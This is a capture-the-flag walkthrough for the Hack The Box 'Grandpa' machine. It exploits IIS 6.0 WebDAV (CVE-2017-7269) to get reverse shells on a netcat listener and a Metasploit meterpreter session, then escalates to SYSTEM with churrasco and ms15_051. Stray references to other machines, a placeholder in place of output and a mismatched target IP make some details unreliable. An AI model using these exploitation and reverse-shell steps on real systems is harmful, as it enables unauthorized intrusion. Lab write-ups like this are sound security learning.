## Default Information
IP Address: 10.10.10.14\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.14    grandpa.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.14 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-10 01:59:15 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.14 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Microsoft IIS httpd 6.0 | Open |

From the nmap output, we are also able to know that there a list of potentially dangerous methods that are being enabled on port 80.\

```
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://swagshop.htb

```
{Gobuster output}
```
We will also tried to find virtual hosts on http://sense.htb, but we were unable to find any vhosts.

Next, we will try to use Gobuster to do an enumeration for common files extensions such as .js,.txt,.php and .html.

```
http://10.10.10.14:80/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]
http://10.10.10.14:80/_vti_inf.html        (Status: 200) [Size: 1754]
http://10.10.10.14:80/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]
http://10.10.10.14:80/_vti_bin/shtml.dll   (Status: 200) [Size: 96]
http://10.10.10.14:80/postinfo.html        (Status: 200) [Size: 2440]
http://10.10.10.14:80/Images               (Status: 301) [Size: 152] [--> http://10.10.10.14:80/Images/]
http://10.10.10.14:80/_vti_bin             (Status: 301) [Size: 158] [--> http://10.10.10.14:80/%5Fvti%5Fbin/]
http://10.10.10.14:80/images               (Status: 301) [Size: 152] [--> http://10.10.10.14:80/images/]
```

### Web-content discovery
Checking the endpoints that are discovered by Gobuster, we realize that most of the endpoints do not reveal any interesting webpages, nor do they reveal any interesting information that could help us in our exploitation. Furthurmore, directory listing is being disabled on this website and we are unable to view the list of directories on this site. This is a dead-end.

Next, we will use davtest to test for the DAV connection on the web server. Unfortunately, the PUT method is unable to upload any files to the web server.

```
********************************************************
 Sending test files
PUT     pl      FAIL
PUT     jhtml   FAIL
PUT     php     FAIL
PUT     shtml   FAIL
PUT     html    FAIL
PUT     cfm     FAIL
PUT     jsp     FAIL
PUT     asp     FAIL
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     txt     FAIL

********************************************************
```

## Exploit
### CVE-2017-7269
With some research, we realize that IIS 6.0 is vulnerable to CVE-2017-7269 as we can find from [here](https://www.exploit-db.com/exploits/41738).

However, looking at the provided script, we would likely need to replace the shellcode with our own shellcode to generate a reverse shell.

Fortunately, we are able to find a script that allows us to generate reverse shell from [here](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269).

### Obtaining reverse shell
Executing the script will then spawn a reverse shell for us. Sometimes, this script might fail. If this happens, just reset the machine and execute the script again. 

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
c:\windows\system32\inetsrv>
```

### Privilege Escalation to System Administrator

However, we realize that we are unable to obtain the flags as we do not have the required privileges.

```
C:\Documents and Settings>cd Harry
cd Harry
Access is denied.
```

Looking at the systeminfo, we can see that we are using an outdated operating system which is Microsoft(R) Windows(R) Server 2003, Standard Edition, and also there is only 1 hotfix applied and so this machine might be vulnerable to kernel exploits.

```
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
Hotfix(s):                 1 Hotfix(s) Installed.
```

Next, checking the privileges that we have on this machine, we realize that the ```SeImpersonatePrivilege``` is enabled. This potentially means that the machine is potentially vulnerable to potato exploits or churrasco exploits. Since this is operating on an older version of Windows Server 2003, we will try the churrasco exploit. 

However, listing the permission on C:\Windows\Temp, we realize that we do not have the permissions to execute scripts on this folder.

```
C:\WINDOWS>icacls temp
icacls temp
Successfully processed 0 files; Failed processing 1 files
temp: Access is denied.
```

However, we are able to find a weird folder ```wmpub``` at the root directory. Listing the permissions show us that we have the permissions to download, upload and execute scripts on this folder.

```
C:\>icacls wmpub
icacls wmpub
wmpub BUILTIN\Administrators:(F)
      BUILTIN\Administrators:(I)(OI)(CI)(F)
      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
      BUILTIN\Users:(I)(OI)(CI)(RX)
      BUILTIN\Users:(I)(CI)(AD)
      BUILTIN\Users:(I)(CI)(WD)

Successfully processed 1 files; Failed processing 0 files
```

Using churrasco.exe, we realize that the user is now elevated to system adminstrator.

```
C:\wmpub>.\churrasco.exe "whoami"
.\churrasco.exe "whoami"
nt authority\system
```

Lastly, all we have to do is to spawn a reverse shell onto our listener.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.14] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

### Obtaining user flag

```
C:\Documents and Settings\Harry\Desktop>type user.txt
type user.txt
<Redacted user flag>
```
### Obtaining root flag

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```

## Post Exploitation
### Using Metasploit

Firstly, we will try to create a reverse shell using the metasploit module of CVE-2017-7269. To do so, we will be using ```windows/iis/iis_webdav_scstoragepathfromurl``` in metasploit, which will then create a meterpreter session.

```
msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RPORT 80
RPORT => 80
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LPORT 4000
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.16.8:4000 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.16.8:4000 -> 10.10.10.14:1050) at 2022-01-10 06:17:46 -0500
```

However, we realize that the current meterpreter session does not have the required privilege and so we will need to migrate the process to a more privileged and stable process.
```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

To migrate the process to a more privileged and stable process, we will have to first list the process using ```ps``` and then we will then migrate to the process with ```NT AUTHPRITY\NETWORK SERVICE``` privilege.

```
meterpreter > migrate 2176
[*] Migrating from 1388 to 2176...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

Next, we will have to background the current meterpreter session.

```
meterpreter > background
[*] Backgrounding session 1...
```

Afterwards, we will look for potential kernel exploits using the multi/recon/post/local_exploit_suggester module.

```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1 
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 38 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

From our testing, the following modules are vulnerable to exploitation.
- exploit/windows/local/ms10_015_kitrap0d
- windows/local/ms14_070_tcpip_ioctl
- exploit/windows/local/ms15_051_client_copy_image

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
set LHOST 10.10.16.8
set SESSION 1
set LPORT 3000
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.16.8:3000 
[*] Launching notepad to host the exploit...
[+] Process 3272 launched.
[*] Reflectively injecting the exploit DLL into 3272...
[*] Injecting exploit into 3272...
[*] Exploit injected. Injecting payload into 3272...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.16.8:3000 -> 10.10.10.15:1032) at 2022-01-08 08:26:39 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
